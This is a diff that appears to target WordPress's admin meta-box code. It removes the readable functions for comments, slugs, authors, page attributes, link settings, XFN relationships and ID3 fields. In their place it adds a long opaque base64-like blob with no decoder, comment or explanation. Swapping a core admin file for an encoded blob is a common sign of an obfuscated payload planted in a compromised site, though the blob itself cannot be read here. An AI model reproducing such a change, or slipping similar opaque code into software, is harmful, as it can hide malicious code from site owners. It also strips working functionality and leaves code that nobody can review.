-	wp_nonce_field( 'get-comments', 'add_comment_nonce', false );
-	?>
-	<p class="hide-if-no-js" id="add-new-comment"><a class="button" href="#commentstatusdiv" onclick="window.commentReply && commentReply.addcomment(<?php echo $post->ID; ?>);return false;"><?php _e('Add comment'); ?></a></p>
-	<?php
-
-	$total = get_comments( array( 'post_id' => $post->ID, 'number' => 1, 'count' => true ) );
-	$wp_list_table = _get_list_table('WP_Post_Comments_List_Table');
-	$wp_list_table->display( true );
-
-	if ( 1 > $total ) {
-		echo '<p id="no-comments">' . __('No comments yet.') . '</p>';
-	} else {
-		$hidden = get_hidden_meta_boxes( get_current_screen() );
-		if ( ! in_array('commentsdiv', $hidden) ) {
-			?>
-			<script type="text/javascript">jQuery(document).ready(function(){commentsBox.get(<?php echo $total; ?>, 10);});</script>
-			<?php
-		}
-
-		?>
-		<p class="hide-if-no-js" id="show-comments"><a href="#commentstatusdiv" onclick="commentsBox.load(<?php echo $total; ?>);return false;"><?php _e('Show comments'); ?></a> <span class="spinner"></span></p>
-		<?php
-	}
-
-	wp_comment_trashnotice();
-}
-
-/**
- * Display slug form fields.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_slug_meta_box($post) {
-/** This filter is documented in wp-admin/edit-tag-form.php */
-$editable_slug = apply_filters( 'editable_slug', $post->post_name, $post );
-?>
-<label class="screen-reader-text" for="post_name"><?php _e('Slug') ?></label><input name="post_name" type="text" size="13" id="post_name" value="<?php echo esc_attr( $editable_slug ); ?>" />
-<?php
-}
-
-/**
- * Display form field with list of authors.
- *
- * @since 2.6.0
- *
- * @global int $user_ID
- *
- * @param object $post
- */
-function post_author_meta_box($post) {
-	global $user_ID;
-?>
-<label class="screen-reader-text" for="post_author_override"><?php _e('Author'); ?></label>
-<?php
-	wp_dropdown_users( array(
-		'who' => 'authors',
-		'name' => 'post_author_override',
-		'selected' => empty($post->ID) ? $user_ID : $post->post_author,
-		'include_selected' => true,
-		'show' => 'display_name_with_login',
-	) );
-}
-
-/**
- * Display list of revisions.
- *
- * @since 2.6.0
- *
- * @param object $post
- */
-function post_revisions_meta_box( $post ) {
-	wp_list_post_revisions( $post );
-}
-
-// -- Page related Meta Boxes
-
-/**
- * Display page attributes form fields.
- *
- * @since 2.7.0
- *
- * @param object $post
- */
-function page_attributes_meta_box($post) {
-	if ( is_post_type_hierarchical( $post->post_type ) ) :
-		$dropdown_args = array(
-			'post_type'        => $post->post_type,
-			'exclude_tree'     => $post->ID,
-			'selected'         => $post->post_parent,
-			'name'             => 'parent_id',
-			'show_option_none' => __('(no parent)'),
-			'sort_column'      => 'menu_order, post_title',
-			'echo'             => 0,
-		);
-
-		/**
-		 * Filters the arguments used to generate a Pages drop-down element.
-		 *
-		 * @since 3.3.0
-		 *
-		 * @see wp_dropdown_pages()
-		 *
-		 * @param array   $dropdown_args Array of arguments used to generate the pages drop-down.
-		 * @param WP_Post $post          The current post.
-		 */
-		$dropdown_args = apply_filters( 'page_attributes_dropdown_pages_args', $dropdown_args, $post );
-		$pages = wp_dropdown_pages( $dropdown_args );
-		if ( ! empty($pages) ) :
-?>
-<p class="post-attributes-label-wrapper"><label class="post-attributes-label" for="parent_id"><?php _e( 'Parent' ); ?></label></p>
-<?php echo $pages; ?>
-<?php
-		endif; // end empty pages check
-	endif;  // end hierarchical check.
-
-	if ( count( get_page_templates( $post ) ) > 0 && get_option( 'page_for_posts' ) != $post->ID ) :
-		$template = ! empty( $post->page_template ) ? $post->page_template : false;
-		?>
-<p class="post-attributes-label-wrapper"><label class="post-attributes-label" for="page_template"><?php _e( 'Template' ); ?></label><?php
-	/**
-	 * Fires immediately after the label inside the 'Template' section
-	 * of the 'Page Attributes' meta box.
-	 *
-	 * @since 4.4.0
-	 *
-	 * @param string  $template The template used for the current post.
-	 * @param WP_Post $post     The current post.
-	 */
-	do_action( 'page_attributes_meta_box_template', $template, $post );
-?></p>
-<select name="page_template" id="page_template">
-<?php
-/**
- * Filters the title of the default page template displayed in the drop-down.
- *
- * @since 4.1.0
- *
- * @param string $label   The display value for the default page template title.
- * @param string $context Where the option label is displayed. Possible values
- *                        include 'meta-box' or 'quick-edit'.
- */
-$default_title = apply_filters( 'default_page_template_title',  __( 'Default Template' ), 'meta-box' );
-?>
-<option value="default"><?php echo esc_html( $default_title ); ?></option>
-<?php page_template_dropdown( $template, $post->post_type ); ?>
-</select>
-<?php endif; ?>
-<?php if ( post_type_supports( $post->post_type, 'page-attributes' ) ) : ?>
-<p class="post-attributes-label-wrapper"><label class="post-attributes-label" for="menu_order"><?php _e( 'Order' ); ?></label></p>
-<input name="menu_order" type="text" size="4" id="menu_order" value="<?php echo esc_attr( $post->menu_order ); ?>" />
-<?php
-/**
- * Fires before the help hint text in the 'Page Attributes' meta box.
- *
- * @since 4.9.0
- *
- * @param WP_Post $post The current post.
- */
-do_action( 'page_attributes_misc_attributes', $post );
-?>
-<?php if ( 'page' == $post->post_type && get_current_screen()->get_help_tabs() ) : ?>
-<p><?php _e( 'Need help? Use the Help tab above the screen title.' ); ?></p>
-<?php endif;
-	endif;
-}
-
-// -- Link related Meta Boxes
-
-/**
- * Display link create form fields.
- *
- * @since 2.7.0
- *
- * @param object $link
- */
-function link_submit_meta_box($link) {
-?>
-<div class="submitbox" id="submitlink">
-
-<div id="minor-publishing">
-
-<?php // Hidden submit button early on so that the browser chooses the right button when form is submitted with Return key ?>
-<div style="display:none;">
-<?php submit_button( __( 'Save' ), '', 'save', false ); ?>
-</div>
-
-<div id="minor-publishing-actions">
-<div id="preview-action">
-<?php if ( !empty($link->link_id) ) { ?>
-	<a class="preview button" href="<?php echo $link->link_url; ?>" target="_blank"><?php _e('Visit Link'); ?></a>
-<?php } ?>
-</div>
-<div class="clear"></div>
-</div>
-
-<div id="misc-publishing-actions">
-<div class="misc-pub-section misc-pub-private">
-	<label for="link_private" class="selectit"><input id="link_private" name="link_visible" type="checkbox" value="N" <?php checked($link->link_visible, 'N'); ?> /> <?php _e('Keep this link private') ?></label>
-</div>
-</div>
-
-</div>
-
-<div id="major-publishing-actions">
-<?php
-/** This action is documented in wp-admin/includes/meta-boxes.php */
-do_action( 'post_submitbox_start', null );
-?>
-<div id="delete-action">
-<?php
-if ( !empty($_GET['action']) && 'edit' == $_GET['action'] && current_user_can('manage_links') ) { ?>
-	<a class="submitdelete deletion" href="<?php echo wp_nonce_url("link.php?action=delete&amp;link_id=$link->link_id", 'delete-bookmark_' . $link->link_id); ?>" onclick="if ( confirm('<?php echo esc_js(sprintf(__("You are about to delete this link '%s'\n  'Cancel' to stop, 'OK' to delete."), $link->link_name )); ?>') ) {return true;}return false;"><?php _e('Delete'); ?></a>
-<?php } ?>
-</div>
-
-<div id="publishing-action">
-<?php if ( !empty($link->link_id) ) { ?>
-	<input name="save" type="submit" class="button button-primary button-large" id="publish" value="<?php esc_attr_e( 'Update Link' ) ?>" />
-<?php } else { ?>
-	<input name="save" type="submit" class="button button-primary button-large" id="publish" value="<?php esc_attr_e( 'Add Link' ) ?>" />
-<?php } ?>
-</div>
-<div class="clear"></div>
-</div>
-<?php
-/**
- * Fires at the end of the Publish box in the Link editing screen.
- *
- * @since 2.5.0
- */
-do_action( 'submitlink_box' );
-?>
-<div class="clear"></div>
-</div>
-<?php
-}
-
-/**
- * Display link categories form fields.
- *
- * @since 2.6.0
- *
- * @param object $link
- */
-function link_categories_meta_box($link) {
-?>
-<div id="taxonomy-linkcategory" class="categorydiv">
-	<ul id="category-tabs" class="category-tabs">
-		<li class="tabs"><a href="#categories-all"><?php _e( 'All Categories' ); ?></a></li>
-		<li class="hide-if-no-js"><a href="#categories-pop"><?php _ex( 'Most Used', 'categories' ); ?></a></li>
-	</ul>
-
-	<div id="categories-all" class="tabs-panel">
-		<ul id="categorychecklist" data-wp-lists="list:category" class="categorychecklist form-no-clear">
-			<?php
-			if ( isset($link->link_id) )
-				wp_link_category_checklist($link->link_id);
-			else
-				wp_link_category_checklist();
-			?>
-		</ul>
-	</div>
-
-	<div id="categories-pop" class="tabs-panel" style="display: none;">
-		<ul id="categorychecklist-pop" class="categorychecklist form-no-clear">
-			<?php wp_popular_terms_checklist('link_category'); ?>
-		</ul>
-	</div>
-
-	<div id="category-adder" class="wp-hidden-children">
-		<a id="category-add-toggle" href="#category-add" class="taxonomy-add-new"><?php _e( '+ Add New Category' ); ?></a>
-		<p id="link-category-add" class="wp-hidden-child">
-			<label class="screen-reader-text" for="newcat"><?php _e( '+ Add New Category' ); ?></label>
-			<input type="text" name="newcat" id="newcat" class="form-required form-input-tip" value="<?php esc_attr_e( 'New category name' ); ?>" aria-required="true" />
-			<input type="button" id="link-category-add-submit" data-wp-lists="add:categorychecklist:link-category-add" class="button" value="<?php esc_attr_e( 'Add' ); ?>" />
-			<?php wp_nonce_field( 'add-link-category', '_ajax_nonce', false ); ?>
-			<span id="category-ajax-response"></span>
-		</p>
-	</div>
-</div>
-<?php
-}
-
-/**
- * Display form fields for changing link target.
- *
- * @since 2.6.0
- *
- * @param object $link
- */
-function link_target_meta_box($link) { ?>
-<fieldset><legend class="screen-reader-text"><span><?php _e('Target') ?></span></legend>
-<p><label for="link_target_blank" class="selectit">
-<input id="link_target_blank" type="radio" name="link_target" value="_blank" <?php echo ( isset( $link->link_target ) && ($link->link_target == '_blank') ? 'checked="checked"' : ''); ?> />
-<?php _e('<code>_blank</code> &mdash; new window or tab.'); ?></label></p>
-<p><label for="link_target_top" class="selectit">
-<input id="link_target_top" type="radio" name="link_target" value="_top" <?php echo ( isset( $link->link_target ) && ($link->link_target == '_top') ? 'checked="checked"' : ''); ?> />
-<?php _e('<code>_top</code> &mdash; current window or tab, with no frames.'); ?></label></p>
-<p><label for="link_target_none" class="selectit">
-<input id="link_target_none" type="radio" name="link_target" value="" <?php echo ( isset( $link->link_target ) && ($link->link_target == '') ? 'checked="checked"' : ''); ?> />
-<?php _e('<code>_none</code> &mdash; same window or tab.'); ?></label></p>
-</fieldset>
-<p><?php _e('Choose the target frame for your link.'); ?></p>
-<?php
-}
-
-/**
- * Display checked checkboxes attribute for xfn microformat options.
- *
- * @since 1.0.1
- *
- * @global object $link
- *
- * @param string $class
- * @param string $value
- * @param mixed $deprecated Never used.
- */
-function xfn_check( $class, $value = '', $deprecated = '' ) {
-	global $link;
-
-	if ( ! empty( $deprecated ) ) {
-		_deprecated_argument( __FUNCTION__, '2.5.0' ); // Never implemented
-	}
-
-	$link_rel = isset( $link->link_rel ) ? $link->link_rel : ''; // In PHP 5.3: $link_rel = $link->link_rel ?: '';
-	$rels = preg_split('/\s+/', $link_rel);
-
-	if ('' != $value && in_array($value, $rels) ) {
-		echo ' checked="checked"';
-	}
-
-	if ('' == $value) {
-		if ('family' == $class && strpos($link_rel, 'child') === false && strpos($link_rel, 'parent') === false && strpos($link_rel, 'sibling') === false && strpos($link_rel, 'spouse') === false && strpos($link_rel, 'kin') === false) echo ' checked="checked"';
-		if ('friendship' == $class && strpos($link_rel, 'friend') === false && strpos($link_rel, 'acquaintance') === false && strpos($link_rel, 'contact') === false) echo ' checked="checked"';
-		if ('geographical' == $class && strpos($link_rel, 'co-resident') === false && strpos($link_rel, 'neighbor') === false) echo ' checked="checked"';
-		if ('identity' == $class && in_array('me', $rels) ) echo ' checked="checked"';
-	}
-}
-
-/**
- * Display xfn form fields.
- *
- * @since 2.6.0
- *
- * @param object $link
- */
-function link_xfn_meta_box($link) {
-?>
-<table class="links-table">
-	<tr>
-		<th scope="row"><label for="link_rel"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('rel:') ?></label></th>
-		<td><input type="text" name="link_rel" id="link_rel" value="<?php echo ( isset( $link->link_rel ) ? esc_attr($link->link_rel) : ''); ?>" /></td>
-	</tr>
-	<tr>
-		<th scope="row"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('identity') ?></th>
-		<td><fieldset><legend class="screen-reader-text"><span><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('identity') ?></span></legend>
-			<label for="me">
-			<input type="checkbox" name="identity" value="me" id="me" <?php xfn_check('identity', 'me'); ?> />
-			<?php _e('another web address of mine') ?></label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('friendship') ?></th>
-		<td><fieldset><legend class="screen-reader-text"><span><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('friendship') ?></span></legend>
-			<label for="contact">
-			<input class="valinp" type="radio" name="friendship" value="contact" id="contact" <?php xfn_check('friendship', 'contact'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('contact') ?>
-			</label>
-			<label for="acquaintance">
-			<input class="valinp" type="radio" name="friendship" value="acquaintance" id="acquaintance" <?php xfn_check('friendship', 'acquaintance'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('acquaintance') ?>
-			</label>
-			<label for="friend">
-			<input class="valinp" type="radio" name="friendship" value="friend" id="friend" <?php xfn_check('friendship', 'friend'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('friend') ?>
-			</label>
-			<label for="friendship">
-			<input name="friendship" type="radio" class="valinp" value="" id="friendship" <?php xfn_check('friendship'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('none') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"> <?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('physical') ?> </th>
-		<td><fieldset><legend class="screen-reader-text"><span><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('physical') ?></span></legend>
-			<label for="met">
-			<input class="valinp" type="checkbox" name="physical" value="met" id="met" <?php xfn_check('physical', 'met'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('met') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"> <?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('professional') ?> </th>
-		<td><fieldset><legend class="screen-reader-text"><span><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('professional') ?></span></legend>
-			<label for="co-worker">
-			<input class="valinp" type="checkbox" name="professional" value="co-worker" id="co-worker" <?php xfn_check('professional', 'co-worker'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('co-worker') ?>
-			</label>
-			<label for="colleague">
-			<input class="valinp" type="checkbox" name="professional" value="colleague" id="colleague" <?php xfn_check('professional', 'colleague'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('colleague') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('geographical') ?></th>
-		<td><fieldset><legend class="screen-reader-text"><span> <?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('geographical') ?> </span></legend>
-			<label for="co-resident">
-			<input class="valinp" type="radio" name="geographical" value="co-resident" id="co-resident" <?php xfn_check('geographical', 'co-resident'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('co-resident') ?>
-			</label>
-			<label for="neighbor">
-			<input class="valinp" type="radio" name="geographical" value="neighbor" id="neighbor" <?php xfn_check('geographical', 'neighbor'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('neighbor') ?>
-			</label>
-			<label for="geographical">
-			<input class="valinp" type="radio" name="geographical" value="" id="geographical" <?php xfn_check('geographical'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('none') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('family') ?></th>
-		<td><fieldset><legend class="screen-reader-text"><span> <?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('family') ?> </span></legend>
-			<label for="child">
-			<input class="valinp" type="radio" name="family" value="child" id="child" <?php xfn_check('family', 'child'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('child') ?>
-			</label>
-			<label for="kin">
-			<input class="valinp" type="radio" name="family" value="kin" id="kin" <?php xfn_check('family', 'kin'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('kin') ?>
-			</label>
-			<label for="parent">
-			<input class="valinp" type="radio" name="family" value="parent" id="parent" <?php xfn_check('family', 'parent'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('parent') ?>
-			</label>
-			<label for="sibling">
-			<input class="valinp" type="radio" name="family" value="sibling" id="sibling" <?php xfn_check('family', 'sibling'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('sibling') ?>
-			</label>
-			<label for="spouse">
-			<input class="valinp" type="radio" name="family" value="spouse" id="spouse" <?php xfn_check('family', 'spouse'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('spouse') ?>
-			</label>
-			<label for="family">
-			<input class="valinp" type="radio" name="family" value="" id="family" <?php xfn_check('family'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('none') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-	<tr>
-		<th scope="row"><?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('romantic') ?></th>
-		<td><fieldset><legend class="screen-reader-text"><span> <?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('romantic') ?> </span></legend>
-			<label for="muse">
-			<input class="valinp" type="checkbox" name="romantic" value="muse" id="muse" <?php xfn_check('romantic', 'muse'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('muse') ?>
-			</label>
-			<label for="crush">
-			<input class="valinp" type="checkbox" name="romantic" value="crush" id="crush" <?php xfn_check('romantic', 'crush'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('crush') ?>
-			</label>
-			<label for="date">
-			<input class="valinp" type="checkbox" name="romantic" value="date" id="date" <?php xfn_check('romantic', 'date'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('date') ?>
-			</label>
-			<label for="romantic">
-			<input class="valinp" type="checkbox" name="romantic" value="sweetheart" id="romantic" <?php xfn_check('romantic', 'sweetheart'); ?> />&nbsp;<?php /* translators: xfn: http://gmpg.org/xfn/ */ _e('sweetheart') ?>
-			</label>
-		</fieldset></td>
-	</tr>
-
-</table>
-<p><?php _e('If the link is to a person, you can specify your relationship with them using the above form. If you would like to learn more about the idea check out <a href="http://gmpg.org/xfn/">XFN</a>.'); ?></p>
-<?php
-}
-
-/**
- * Display advanced link options form fields.
- *
- * @since 2.6.0
- *
- * @param object $link
- */
-function link_advanced_meta_box($link) {
-?>
-<table class="links-table" cellpadding="0">
-	<tr>
-		<th scope="row"><label for="link_image"><?php _e('Image Address') ?></label></th>
-		<td><input type="text" name="link_image" class="code" id="link_image" maxlength="255" value="<?php echo ( isset( $link->link_image ) ? esc_attr($link->link_image) : ''); ?>" /></td>
-	</tr>
-	<tr>
-		<th scope="row"><label for="rss_uri"><?php _e('RSS Address') ?></label></th>
-		<td><input name="link_rss" class="code" type="text" id="rss_uri" maxlength="255" value="<?php echo ( isset( $link->link_rss ) ? esc_attr($link->link_rss) : ''); ?>" /></td>
-	</tr>
-	<tr>
-		<th scope="row"><label for="link_notes"><?php _e('Notes') ?></label></th>
-		<td><textarea name="link_notes" id="link_notes" rows="10"><?php echo ( isset( $link->link_notes ) ? $link->link_notes : ''); // textarea_escaped ?></textarea></td>
-	</tr>
-	<tr>
-		<th scope="row"><label for="link_rating"><?php _e('Rating') ?></label></th>
-		<td><select name="link_rating" id="link_rating" size="1">
-		<?php
-			for ( $r = 0; $r <= 10; $r++ ) {
-				echo '<option value="' . $r . '"';
-				if ( isset($link->link_rating) && $link->link_rating == $r )
-					echo ' selected="selected"';
-				echo('>' . $r . '</option>');
-			}
-		?></select>&nbsp;<?php _e('(Leave at 0 for no rating.)') ?>
-		</td>
-	</tr>
-</table>
-<?php
-}
-
-/**
- * Display post thumbnail meta box.
- *
- * @since 2.9.0
- *
- * @param WP_Post $post A post object.
- */
-function post_thumbnail_meta_box( $post ) {
-	$thumbnail_id = get_post_meta( $post->ID, '_thumbnail_id', true );
-	echo _wp_post_thumbnail_html( $thumbnail_id, $post->ID );
-}
-
-/**
- * Display fields for ID3 data
- *
- * @since 3.9.0
- *
- * @param WP_Post $post A post object.
- */
-function attachment_id3_data_meta_box( $post ) {
-	$meta = array();
-	if ( ! empty( $post->ID ) ) {
-		$meta = wp_get_attachment_metadata( $post->ID );
-	}
-
-	foreach ( wp_get_attachment_id3_keys( $post, 'edit' ) as $key => $label ) : ?>
-	<p>
-		<label for="title"><?php echo $label ?></label><br />
-		<input type="text" name="id3_<?php echo esc_attr( $key ) ?>" id="id3_<?php echo esc_attr( $key ) ?>" class="large-text" value="<?php
-			if ( ! empty( $meta[ $key ] ) ) {
-				echo esc_attr( $meta[ $key ] );
-			}
-		?>" />
-	</p>
-	<?php
-	endforeach;
-}
+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
